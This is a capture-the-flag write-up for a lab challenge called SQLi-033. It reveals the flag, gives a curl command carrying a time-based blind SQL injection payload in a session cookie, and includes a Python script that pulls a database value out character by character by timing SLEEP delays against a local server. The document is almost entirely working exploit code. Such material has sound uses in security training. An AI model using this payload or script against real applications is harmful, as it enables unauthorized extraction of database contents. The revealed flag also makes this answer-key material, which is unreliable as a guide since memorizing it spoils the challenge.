# SQLi-033: MySQL Cookie Time-based - Writeup

## Flag: `FLAG{c00k13_t1m3_bl1nd}`

## Payload

```bash
time curl -b "session_id=sess_abc123' AND IF(SUBSTRING((SELECT value FROM flags LIMIT 1),1,1)='F',SLEEP(2),0)-- -" http://localhost:5033/
```

## Exploit

```python
import requests, time

def check(cond):
    start = time.time()
    cookie = f"sess_abc123' AND IF({cond},SLEEP(2),0)-- -"
    requests.get("http://localhost:5033/", cookies={"session_id": cookie})
    return time.time() - start > 1.5

flag = ""
for pos in range(1, 30):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        if check(f"SUBSTRING((SELECT value FROM flags LIMIT 1),{pos},1)='{c}'"):
            flag += c
            print(f"[+] {flag}")
            break
```
